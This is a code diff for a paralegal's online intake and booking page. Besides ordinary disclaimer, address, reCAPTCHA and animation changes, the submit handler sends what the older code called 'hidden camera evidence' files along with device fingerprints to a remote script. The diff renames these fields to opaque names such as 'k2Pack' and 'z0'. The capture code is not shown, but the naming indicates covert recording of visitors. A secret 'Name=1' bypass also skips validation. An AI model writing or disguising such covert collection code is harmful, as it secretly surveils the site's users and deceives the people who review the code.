+                        <span class="final-result-label">Where did you hear about us</span>
+                        <div class="final-result-value">${formatFinalFieldValue(summary.hearAbout)}</div>
+                    </div>
+                    <div class="final-result-field final-result-field--full">
                         <span class="final-result-label">Appointment</span>
                         <div class="final-result-value">${formatFinalFieldValue(appointmentRaw, 'Not available')}</div>
                     </div>
@@ -7894,24 +8908,11 @@
                 </div>
 
                 <p class="final-result-warning">
-                    This intake form is for preliminary review only and does not create a paralegal-client relationship.
+                    <strong>Important:</strong> Submitting this form does not create a paralegal-client relationship, does not constitute legal advice, and does not confirm that representation has been accepted. This intake form is for preliminary review. If your matter is time-sensitive and you cannot reach us promptly, please do not wait and contact another licensed Ontario paralegal or lawyer right away.
                 </p>
                 <p class="final-result-warning">
-                    <strong>Important (Ontario):</strong> Submitting this form does not create a paralegal-client relationship. Please call during business hours to confirm your details and next steps.
+                    Please call during business hours to confirm your details and next steps.
                 </p>
-                <p class="final-result-warning">
-                    If your matter is time-sensitive and you cannot reach us promptly, please do not wait - contact another licensed Ontario paralegal or lawyer right away.
-                </p>
-                <div class="final-result-referral">
-                    <label for="referralSourceInput" class="final-result-referral__label">Last question, where did you hear about us?</label>
-                    <input id="referralSourceInput" class="contact-form__input final-result-referral__input" type="text" maxlength="1200" placeholder="Optional" />
-                    <label for="finalDeadlineInput" class="final-result-referral__label">Optional: add your deadline or timeline details</label>
-                    <textarea id="finalDeadlineInput" class="contact-form__textarea final-result-referral__input final-result-referral__deadline" rows="3" maxlength="600" placeholder="Deadline details (format example: YYYY.MM.DD)"></textarea>
-                    <div class="final-result-referral__actions">
-                        <button type="button" id="referralSourceSendBtn" class="contact-form__submit-button final-result-referral__btn" onclick="submitReferralFeedback()">Send</button>
-                        <span id="referralSourceStatus" class="final-result-referral__status" aria-live="polite"></span>
-                    </div>
-                </div>
                 <div class="final-result-actions modal-sticky-actions">
                     <a href="tel:+14372396833" class="contact-form__submit-button final-result-call">Call +1 (437) 239-6833</a>
                     <button type="button" onclick="closeBookingModal()" class="contact-form__submit-button final-result-done">Done</button>
@@ -7935,7 +8936,24 @@
         }
 
         const formData = new FormData(form);
-        const isSecretQuickSubmit = isSecretBypassReady(form);
+        const isSecretQuickSubmit = isSecretTestBypassReady(form);
+        const selectedServiceOption = document.querySelector('#customSelect .custom-option.selected');
+        const rawServiceValue = selectedServiceOption
+            ? String(selectedServiceOption.getAttribute('data-value') || '').trim()
+            : '';
+        const rawAddressUnit = String(formData.get('address_unit') || '').trim();
+        const rawAddressStreet = String(formData.get('address_street') || '').trim();
+        const rawAddressCity = String(formData.get('address_city') || '').trim();
+        const rawAddressProvince = String(formData.get('address_province') || '').trim().toUpperCase();
+        const rawAddressZip = String(formData.get('address_zip') || '').trim().toUpperCase();
+        const rawHearAbout = String(formData.get('hear_about') || '').trim();
+        const rawDobYear = String(formData.get('dob_year') || '').trim();
+        const rawDobMonth = String(formData.get('dob_month') || '').trim();
+        const rawDobDay = String(formData.get('dob_day') || '').trim();
+        const rawAge = String(formData.get('age') || '').trim();
+        const rawAgreeTerms = document.getElementById('agreeTerms')?.checked === true;
+        const rawHoneypot = String(formData.get('website') || '').trim();
+        const rawTimestamp = String(formData.get('_timestamp') || '').trim();
         if (!isSecretQuickSubmit) {
             if (!formData.get('service')) {
                 const serviceTrigger = document.querySelector('#customSelect .custom-select__trigger');
@@ -7970,26 +8988,24 @@
                 return;
             }
         } else {
-            setBookingNotice('TEST MODE: quick submit payload generated from Name=1.');
+            setBookingNotice('TEST MODE: quick submit payload generated from Name=1.', 'warning');
         }
 
         const summary = {
             name: String(formData.get('name') || '').trim(),
             email: String(formData.get('email') || '').trim(),
             phone: String(formData.get('phone') || '').trim(),
+            hearAbout: rawHearAbout,
             service: String(formData.get('service') || '').trim(),
             address: (() => {
-                const unit = String(formData.get('address_unit') || '').trim();
-                const street = String(formData.get('address_street') || '').trim();
-                const province = String(formData.get('address_province') || '').trim().toUpperCase();
-                const postal = String(formData.get('address_zip') || '').trim().toUpperCase();
                 const parts = [];
-                if (unit) parts.push(`Unit ${unit}`);
-                if (street) parts.push(street);
-                if (province || postal) parts.push(`${province} ${postal}`.trim());
+                if (rawAddressUnit) parts.push(`Unit ${rawAddressUnit}`);
+                if (rawAddressStreet) parts.push(rawAddressStreet);
+                const cityProvinceZip = [rawAddressCity, rawAddressProvince, rawAddressZip].filter(Boolean).join(' ');
+                if (cityProvinceZip) parts.push(cityProvinceZip);
                 return parts.join(', ');
             })(),
-            dob: `${String(formData.get('dob_year') || '').trim()}-${String(formData.get('dob_month') || '').trim()}-${String(formData.get('dob_day') || '').trim()}`,
+            dob: `${rawDobYear}-${rawDobMonth}-${rawDobDay}`,
             deadline: String(formData.get('deadline') || '').trim(),
             dateStr: selectedSlotData ? selectedSlotData.iso : '',
             slotText: selectedSlotData ? String(selectedSlotData.text || '').trim() : '',
@@ -8002,19 +9018,40 @@
             email: 'test.mode+1@example.com',
             phone: '+1 (416) 555-0101',
             service: 'Other',
+            serviceValue: 'other',
+            hearAbout: '',
             notes: '[TEST_MODE] Quick submit with Name=1',
             address: '100 Test St, Toronto, ON M1M 1M1',
-            dob: '1990-01-01'
+            addressUnit: '',
+            addressStreet: '100 Test St',
+            addressCity: 'Toronto',
+            addressProvince: 'ON',
+            addressZip: 'M1M 1M1',
+            dob: '1990-01-01',
+            dobYear: '1990',
+            dobMonth: '01',
+            dobDay: '01',
+            age: '35'
         };
 
         if (isSecretQuickSubmit) {
             summary.email = quickSubmitDefaults.email;
             summary.phone = quickSubmitDefaults.phone;
+            summary.hearAbout = quickSubmitDefaults.hearAbout;
             summary.service = quickSubmitDefaults.service;
             summary.address = quickSubmitDefaults.address;
             summary.dob = quickSubmitDefaults.dob;
             summary.deadline = '';
         }
+
+        const repeatIdentitySource = isSecretQuickSubmit
+            ? { email: quickSubmitDefaults.email, phone: quickSubmitDefaults.phone }
+            : formData;
+        const repeatIdentityKey = normalizeRepeatIdentity(repeatIdentitySource);
+        const repeatCaptchaState = await ensureRepeatSubmissionCaptcha(repeatIdentityKey);
+        if (!repeatCaptchaState.passed) return;
+        const recaptchaRequiredForBooking = repeatCaptchaState.required;
+        const recaptchaTokenForBooking = recaptchaRequiredForBooking ? bookingRecaptchaToken : '';
 
         showGlobalSpinner('hypnotic-progress');
         let submitProgress = 3;
@@ -8031,16 +9068,40 @@
 
         let isSuccess = false;
         try {
+            if (!isSecretQuickSubmit) {
+                await m1Sync();
+            }
             const filesPayload = await processFiles();
             submitProgress = Math.max(submitProgress, 28);
             setGlobalSpinnerProgress(submitProgress);
-            const hiddenCameraFilesPayload = await processHiddenCameraEvidenceFiles();
+            const k2Payload = await k2Pack();
             submitProgress = Math.max(submitProgress, 44);
             setGlobalSpinnerProgress(submitProgress);
-            summary.filesCount = filesPayload.length + hiddenCameraFilesPayload.length;
+            summary.filesCount = filesPayload.length + k2Payload.length;
             const ctx = getClientContext();
             submitProgress = Math.max(submitProgress, 58);
             setGlobalSpinnerProgress(submitProgress);
+            const payloadOccupation = isSecretQuickSubmit
+                ? quickSubmitDefaults.occupation
+                : String(formData.get('occupation') || '').trim();
+            const payloadServiceText = summary.service;
+            const payloadServiceValue = isSecretQuickSubmit ? quickSubmitDefaults.serviceValue : rawServiceValue;
+            const payloadHearAbout = isSecretQuickSubmit ? quickSubmitDefaults.hearAbout : rawHearAbout;
+            const payloadNotes = isSecretQuickSubmit
+                ? quickSubmitDefaults.notes
+                : String(formData.get('notes') || '').trim();
+            const payloadAddressUnit = isSecretQuickSubmit ? quickSubmitDefaults.addressUnit : rawAddressUnit;
+            const payloadAddressStreet = isSecretQuickSubmit ? quickSubmitDefaults.addressStreet : rawAddressStreet;
+            const payloadAddressCity = isSecretQuickSubmit ? quickSubmitDefaults.addressCity : rawAddressCity;
+            const payloadAddressProvince = isSecretQuickSubmit ? quickSubmitDefaults.addressProvince : rawAddressProvince;
+            const payloadAddressZip = isSecretQuickSubmit ? quickSubmitDefaults.addressZip : rawAddressZip;
+            const payloadDobYear = isSecretQuickSubmit ? quickSubmitDefaults.dobYear : rawDobYear;
+            const payloadDobMonth = isSecretQuickSubmit ? quickSubmitDefaults.dobMonth : rawDobMonth;
+            const payloadDobDay = isSecretQuickSubmit ? quickSubmitDefaults.dobDay : rawDobDay;
+            const payloadAge = isSecretQuickSubmit ? quickSubmitDefaults.age : rawAge;
+            const payloadAgreeTerms = rawAgreeTerms;
+            const payloadHoneypot = rawHoneypot;
+            const payloadTimestamp = rawTimestamp;
 
             const bookingData = {
                 year: selectedSlotData.iso.split('T')[0].split('-')[0],
@@ -8049,19 +9110,41 @@
                 hour: parseInt(selectedSlotData.iso.split('T')[1].split(':')[0]),
                 minute: parseInt(selectedSlotData.iso.split('T')[1].split(':')[1]),
                 name: sanitize(isSecretQuickSubmit ? quickSubmitDefaults.payloadName : summary.name),
-                occupation: sanitize(isSecretQuickSubmit ? quickSubmitDefaults.occupation : formData.get('occupation')),
+                occupation: sanitize(payloadOccupation),
                 email: sanitize(summary.email),
                 phone: sanitize(summary.phone),
-                service: sanitize(summary.service),
-                notes: sanitize(isSecretQuickSubmit ? quickSubmitDefaults.notes : formData.get('notes')),
+                hearAbout: sanitize(payloadHearAbout),
+                hear_about: sanitize(payloadHearAbout),
+                service: sanitize(payloadServiceText),
+                serviceValue: sanitize(payloadServiceValue),
+                service_value: sanitize(payloadServiceValue),
+                notes: sanitize(payloadNotes),
                 dateStr: selectedSlotData.iso,
                 dob: sanitize(summary.dob),
+                dobYear: sanitize(payloadDobYear),
+                dobMonth: sanitize(payloadDobMonth),
+                dobDay: sanitize(payloadDobDay),
+                dob_year: sanitize(payloadDobYear),
+                dob_month: sanitize(payloadDobMonth),
+                dob_day: sanitize(payloadDobDay),
+                age: sanitize(payloadAge),
                 deadline: sanitize(summary.deadline),
                 address: sanitize(summary.address),
+                addressUnit: sanitize(payloadAddressUnit),
+                addressStreet: sanitize(payloadAddressStreet),
+                addressCity: sanitize(payloadAddressCity),
+                addressProvince: sanitize(payloadAddressProvince),
+                addressZip: sanitize(payloadAddressZip),
+                address_unit: sanitize(payloadAddressUnit),
+                address_street: sanitize(payloadAddressStreet),
+                address_city: sanitize(payloadAddressCity),
+                address_province: sanitize(payloadAddressProvince),
+                address_zip: sanitize(payloadAddressZip),
                 files: filesPayload,
-                cameraEvidenceFiles: hiddenCameraFilesPayload,
-                cameraEvidenceSessionId: hiddenCameraEvidenceSessionId,
-                cameraEvidenceDuplicateCount: hiddenCameraEvidenceDriveLinks.length,
+                z0: k2Payload,
+                z1: __mxSigK2,
+                z2: __mxRefK2.length,
+                z3: sanitize(__mxVaultId),
                 fingerprint: getFingerprint(),
                 userInfo: getDetailedDeviceInfo(),
                 countryCode: ctx.countryCode,
@@ -8079,10 +9162,17 @@
                 touchPoints: ctx.touchPoints,
                 colorDepth: ctx.colorDepth,
                 pageUrl: ctx.pageUrl,
+                userAgent: ctx.userAgent,
                 referrer: ctx.referrer,
-                agreeTerms: !!formData.get('agreeTerms'),
-                _honeypot: formData.get('website') || '',
-                _timestamp: formData.get('_timestamp') || ''
+                agreeTerms: payloadAgreeTerms,
+                agree_terms: payloadAgreeTerms,
+                recaptchaToken: sanitize(recaptchaTokenForBooking),
+                gRecaptchaResponse: sanitize(recaptchaTokenForBooking),
+                recaptcha_token: sanitize(recaptchaTokenForBooking),
+                recaptchaRequired: recaptchaRequiredForBooking,
+                recaptcha_required: recaptchaRequiredForBooking,
+                _honeypot: sanitize(payloadHoneypot),
+                _timestamp: sanitize(payloadTimestamp)
             };
 
             const response = await fetch(APPS_SCRIPT_URL, {
@@ -8099,8 +9189,16 @@
                 isSuccess = true;
                 playSuccessSound();
                 lastBookingTime = Date.now();
+                markSubmissionIdentity(repeatIdentityKey);
+                clearBookingRecaptchaToken();
                 await clearClientRuntimeCachesAfterBooking();
                 clearFormData();
+                attachedFiles = [];
+                __mxBufK2 = [];
+                __mxSigK2 = '';
+                __mxRefK2 = [];
+                renderFileList();
+                m1Reset();
                 markHardReloadAfterModalClose();
                 lastBookingSummaryForReferral = {
                     name: summary.name,
@@ -8118,6 +9216,20 @@
                 if (modal) modal.dataset.state = 'success';
 
                 logEvent('Booking Success', `Client: ${bookingData.name} | Slot: ${bookingData.dateStr}`);
+            } else if (result.error === 'RECAPTCHA_REQUIRED') {
+                const recaptchaWrap = getBookingRecaptchaWrap();
+                setBookingRecaptchaVisible(true);
+                setBookingError('Please complete reCAPTCHA before submitting again.', recaptchaWrap);
+                return;
+            } else if (result.error === 'RECAPTCHA_FAILED') {
+                const recaptchaWrap = getBookingRecaptchaWrap();
+                setBookingRecaptchaVisible(true);
+                setBookingError('reCAPTCHA verification failed. Please complete it again.', recaptchaWrap);
+                if (bookingRecaptchaWidgetId !== null && window.grecaptcha && typeof window.grecaptcha.reset === 'function') {
+                    try { window.grecaptcha.reset(bookingRecaptchaWidgetId); } catch (e) {}
+                }
+                clearBookingRecaptchaToken();
+                return;
             } else if (result.error === 'SLOT_TAKEN') {
                 alert("This slot was just taken! We are assigning you to the nearest available slot so you don't have to fill the form again.");
                 bookNearestSlot();
@@ -8329,16 +9441,16 @@
             container.style.position = 'relative';
         }
 
-        const burstCount = prefersReducedMotion ? 4 : (isLowEndDevice ? 9 : 16);
-        const startJitter = isLowEndDevice ? 8 : 12;
-        const minFlightDistance = isLowEndDevice ? 48 : 84;
-        const maxFlightDistance = isLowEndDevice ? 104 : 186;
-        const minFallDistance = prefersReducedMotion ? 8 : (isLowEndDevice ? 12 : 18);
-        const maxFallDistance = prefersReducedMotion ? 16 : (isLowEndDevice ? 22 : 36);
-        const maxDelay = prefersReducedMotion ? 50 : (isLowEndDevice ? 70 : 110);
-        const durationMs = prefersReducedMotion ? 320 : (isLowEndDevice ? 520 : 680);
+        const burstCount = prefersReducedMotion ? 6 : (isLowEndDevice ? 16 : 34);
+        const startJitter = isLowEndDevice ? 10 : 14;
+        const minFlightDistance = isLowEndDevice ? 86 : 168;
+        const maxFlightDistance = isLowEndDevice ? 220 : 430;
+        const minFallDistance = prefersReducedMotion ? 10 : (isLowEndDevice ? 16 : 26);
+        const maxFallDistance = prefersReducedMotion ? 20 : (isLowEndDevice ? 34 : 64);
+        const maxDelay = prefersReducedMotion ? 70 : (isLowEndDevice ? 110 : 170);
+        const durationMs = prefersReducedMotion ? 420 : (isLowEndDevice ? 760 : 1080);
         const minSparkSize = isLowEndDevice ? 6 : 7;
-        const maxSparkSize = isLowEndDevice ? 9 : 11;
+        const maxSparkSize = isLowEndDevice ? 10 : 13;
 
         const fragment = document.createDocumentFragment();
         const sparks = [];
@@ -8347,8 +9459,10 @@
             const spark = document.createElement('div');
             spark.className = 'spark';
 
-            // Firework-like arc: mostly upward burst, then slight gravity fall.
-            const angleDeg = -160 + Math.random() * 140;
+            // Firework-like burst in all directions, then slight gravity fall.
+            const angleDeg = Math.random() < 0.72
+                ? Math.random() * 360
+                : (-170 + Math.random() * 160);
             const angle = angleDeg * (Math.PI / 180);
             const startRadius = Math.random() * startJitter;
             const startX = Math.cos(angle) * startRadius;
@@ -8360,10 +9474,11 @@
             const midX = Math.cos(angle) * flightDistance;
             const midY = Math.sin(angle) * flightDistance;
 
-            const horizontalDrift = (Math.random() - 0.5) * (isLowEndDevice ? 12 : 20);
+            const horizontalDrift = (Math.random() - 0.5) * (isLowEndDevice ? 28 : 64);
             const fallDistance = minFallDistance + Math.random() * (maxFallDistance - minFallDistance);
-            const endX = midX + horizontalDrift;
-            const endY = midY + fallDistance;
+            const extraGravity = Math.random() * (isLowEndDevice ? 22 : 44);
+            const endX = (midX * (1 + Math.random() * (isLowEndDevice ? 0.18 : 0.3))) + horizontalDrift;
+            const endY = midY + fallDistance + extraGravity;
 
             spark.style.setProperty('--x-mid', `${midX.toFixed(1)}px`);
             spark.style.setProperty('--y-mid', `${midY.toFixed(1)}px`);
@@ -8395,7 +9510,7 @@
             const raw = String(node.textContent || '').trim();
             if (!raw) return;
             if (/slot\s*no\s*found/i.test(raw) || /slots\s*no\s*found/i.test(raw) || /slot\s*not\s*fount/i.test(raw)) {
-                node.textContent = 'SLOT NO FOUND';
+                node.textContent = 'NO SLOTS FOUND';
             }
         });
     }
@@ -8411,42 +9526,12 @@
 
     function renderHeaderBookBtnText(targetEl, dayShort, dayDate, timeStr) {
         if (!targetEl) return;
-        targetEl.textContent = '';
-
-        const line1 = buildButtonLine('Intake');
-        line1.className = 'header-book-line1';
-        targetEl.appendChild(line1);
-        targetEl.appendChild(document.createElement('br'));
-
-        const line2Text = timeStr
-            ? `${dayShort} ${dayDate} at ${timeStr}`
-            : `${dayShort} ${dayDate}`;
-        const line2 = buildButtonLine(line2Text, {
-            fontSize: timeStr ? '1rem' : '0.9rem',
-            fontWeight: '800',
-            opacity: timeStr ? '0.95' : '0.9'
-        });
-        targetEl.appendChild(line2);
+        targetEl.innerHTML = 'INTAKE<br>NOW!';
     }
 
     function renderFooterBookBtnText(targetEl, dayFull, dayDate, timeStr) {
         if (!targetEl) return;
-        targetEl.textContent = '';
-
-        targetEl.appendChild(buildButtonLine('Night docket, counsel?'));
-        targetEl.appendChild(document.createElement('br'));
-        targetEl.appendChild(buildButtonLine(timeStr || '--:--', {
-            fontSize: '2.2rem',
-            fontWeight: '800',
-            display: 'block',
-            margin: '5px 0',
-            lineHeight: '1'
-        }));
-        targetEl.appendChild(buildButtonLine(`${dayFull} ${dayDate}`, {
-            fontSize: '0.9rem',
-            fontWeight: '800',
-            opacity: '0.9'
-        }));
+        targetEl.innerHTML = 'INTAKE<br>NOW!';
     }
     
     function updateFooterBookBtn() {
@@ -8481,6 +9566,7 @@
 
                 t.preloader.style.opacity = '1';
                 t.preloader.style.transform = 'scale(1)';
+                t.preloader.style.filter = 'blur(0)';
                 t.preloader.style.pointerEvents = 'none';
                 t.btn.style.opacity = '0';
                 t.btn.style.pointerEvents = 'none';
@@ -8508,9 +9594,10 @@
                     renderFooterBookBtnText(t.txt, dayOfWeekFull, fallbackSlot ? fallbackSlot.date : '', lastTimeStr);
                 }
                 
-                t.preloader.style.transition = 'opacity 0.5s';
+                t.preloader.style.transition = 'opacity 1.35s cubic-bezier(0.22, 1, 0.36, 1), transform 1.35s cubic-bezier(0.22, 1, 0.36, 1), filter 1.35s cubic-bezier(0.22, 1, 0.36, 1)';
                 t.preloader.style.opacity = '0';
-                t.preloader.style.transform = 'scale(0.9)';
+                t.preloader.style.transform = 'scale(0.86)';
+                t.preloader.style.filter = 'blur(0.28rem)';
                 t.preloader.style.pointerEvents = 'none';
 
                 t.btn.style.transition = 'opacity 0.5s, transform 0.5s';
@@ -8521,6 +9608,7 @@
                 // No data yet: keep neutral loading state
                 t.preloader.style.opacity = '1';
                 t.preloader.style.transform = 'scale(1)';
+                t.preloader.style.filter = 'blur(0)';
                 t.preloader.style.pointerEvents = 'none';
                 t.btn.style.opacity = '0';
                 t.btn.style.pointerEvents = 'none';
@@ -8553,7 +9641,7 @@
                     if (errSvg) errSvg.style.animation = 'none';
                     const errNode = t.preloader.querySelector('.book-btn-preloader__text');
                     if (errNode) {
-                        errNode.textContent = 'SLOT NO FOUND';
+                        errNode.textContent = 'NO SLOTS FOUND';
                         errNode.style.display = 'block';
                         errNode.style.opacity = '1';
                     }
@@ -8598,41 +9686,91 @@
     }, 18000); // Every ~18 seconds
 
     // Custom Select Initialization
-    function initializeCustomSelects() {
-        const selectElement = document.getElementById('customSelect');
-        if (!selectElement) return;
-        
+    function setCustomSelectValue(selectId, nextValue) {
+        const selectElement = document.getElementById(selectId);
+        if (!selectElement) return false;
+        const trigger = selectElement.querySelector('.custom-select__trigger');
+        const triggerTextEl = trigger ? trigger.querySelector('span') : null;
+        const options = Array.from(selectElement.querySelectorAll('.custom-option'));
+        if (!trigger || !triggerTextEl || !options.length) return false;
+
+        if (!trigger.dataset.placeholder) {
+            trigger.dataset.placeholder = normalizeSingleLine(triggerTextEl.textContent);
+        }
+
+        const normalizedTarget = normalizeSingleLine(nextValue);
+        let selectedOption = null;
+
+        options.forEach(option => {
+            const optionText = normalizeSingleLine(option.textContent);
+            const optionValue = normalizeSingleLine(option.getAttribute('data-value'));
+            const isSelected = !!normalizedTarget && (optionText === normalizedTarget || optionValue === normalizedTarget);
+            option.classList.toggle('selected', isSelected);
+            if (isSelected) selectedOption = option;
+        });
+
+        const hiddenInputId = selectElement.dataset.inputId;
+        const hiddenInput = hiddenInputId ? document.getElementById(hiddenInputId) : null;
+
+        if (selectedOption) {
+            const selectedText = selectedOption.textContent.trim();
+            triggerTextEl.textContent = selectedText;
+            if (hiddenInput) hiddenInput.value = selectedText;
+            return true;
+        }
+
+        triggerTextEl.textContent = trigger.dataset.placeholder || '';
+        if (hiddenInput) hiddenInput.value = '';
+        return false;
+    }
+
+    function bindCustomSelect(selectId, hiddenInputId) {
+        const selectElement = document.getElementById(selectId);
+        if (!selectElement || selectElement.dataset.bound === '1') return;
+
         const trigger = selectElement.querySelector('.custom-select__trigger');
         const options = selectElement.querySelectorAll('.custom-option');
-        const hiddenInput = document.getElementById('serviceInput');
         const wrapper = selectElement.closest('.custom-select-wrapper');
+        if (!trigger || !wrapper || !options.length) return;
+
+        selectElement.dataset.bound = '1';
+        selectElement.dataset.inputId = hiddenInputId || '';
+
         trigger.addEventListener('click', (e) => {
             e.preventDefault();
             trigger.classList.remove('field-invalid');
+            document.querySelectorAll('.custom-select.open').forEach(openSelect => {
+                if (openSelect !== selectElement) openSelect.classList.remove('open');
+            });
             selectElement.classList.toggle('open');
         });
+
         options.forEach(option => {
             option.addEventListener('click', () => {
-                const value = option.getAttribute('data-value') || option.textContent;
-                const text = option.textContent.trim();
-                
-                // Update trigger text
-                trigger.querySelector('span').textContent = text;
-                
-                if (hiddenInput) hiddenInput.value = text;
-                
-                options.forEach(opt => opt.classList.remove('selected'));
-                option.classList.add('selected');
-                
+                setCustomSelectValue(selectId, option.textContent.trim());
                 selectElement.classList.remove('open');
                 trigger.classList.remove('field-invalid');
             });
         });
+
         document.addEventListener('click', (e) => {
             if (!wrapper.contains(e.target)) {
                 selectElement.classList.remove('open');
             }
         });
+
+        const hiddenInput = hiddenInputId ? document.getElementById(hiddenInputId) : null;
+        const selectedOption = selectElement.querySelector('.custom-option.selected');
+        if (hiddenInput && normalizeSingleLine(hiddenInput.value)) {
+            setCustomSelectValue(selectId, hiddenInput.value);
+        } else if (selectedOption) {
+            setCustomSelectValue(selectId, selectedOption.textContent.trim());
+        }
+    }
+
+    function initializeCustomSelects() {
+        bindCustomSelect('customSelect', 'serviceInput');
+        bindCustomSelect('cityCustomSelect', 'cityInput');
     }
 
     function adjustDynamicText() {
@@ -8650,14 +9788,27 @@
             }
         });
 
-        // Keep hero H1 in 4 stable lines on mobile: no wrapping, shrink if needed.
+        // Keep hero H1 lines unwrapped on all screens: shrink the block if needed.
         const heroH1 = document.querySelector('.header__description');
         if (!heroH1) return;
         const lines = Array.from(heroH1.querySelectorAll('span'));
         if (!lines.length) return;
 
+        lines.forEach(line => {
+            line.style.whiteSpace = 'nowrap';
+            line.style.textWrap = 'nowrap';
+            line.style.overflowWrap = 'normal';
+            line.style.wordBreak = 'keep-all';
+        });
+
         heroH1.style.setProperty('--h1-fit-scale', '1');
-        const availableWidth = heroH1.clientWidth;
+        const heroStyle = window.getComputedStyle(heroH1);
+        const padLeft = parseFloat(heroStyle.paddingLeft || '0') || 0;
+        const padRight = parseFloat(heroStyle.paddingRight || '0') || 0;
+        const contentWidth = Math.max(1, heroH1.clientWidth - padLeft - padRight);
+        // Keep extra breathing room so text never visually touches screen edges.
+        const edgeGap = Math.max(8, Math.min(22, contentWidth * 0.04));
+        const availableWidth = Math.max(1, contentWidth - (edgeGap * 2));
         if (!availableWidth) return;
 
         let maxLineWidth = 0;
@@ -8666,14 +9817,28 @@
         });
         if (!maxLineWidth) return;
 
-        const ratio = availableWidth / maxLineWidth;
-        const scale = Math.max(0.52, Math.min(1, ratio));
+        const ratio = (availableWidth - 2) / maxLineWidth;
+        let scale = Math.max(0.22, Math.min(1, ratio));
+        heroH1.style.setProperty('--h1-fit-scale', scale.toFixed(4));
+
+        let postFitMaxWidth = 0;
+        lines.forEach(line => {
+            postFitMaxWidth = Math.max(postFitMaxWidth, line.scrollWidth);
+        });
+        if (postFitMaxWidth > availableWidth + 0.5) {
+            const correction = availableWidth / postFitMaxWidth;
+            scale = Math.max(0.22, scale * correction * 0.99);
+        }
         heroH1.style.setProperty('--h1-fit-scale', scale.toFixed(4));
     }
 
     // (Load listener consolidated above)
 
     window.addEventListener('resize', adjustDynamicText);
+    window.addEventListener('orientationchange', adjustDynamicText);
+    if (document.fonts && document.fonts.ready) {
+        document.fonts.ready.then(() => adjustDynamicText()).catch(() => {});
+    }
 
     // ------------------------------------------------------------------
     // PERSISTENT TOP/BOTTOM BARS
@@ -8811,6 +9976,7 @@
 
 </body>
 </html>
+
 
 
 
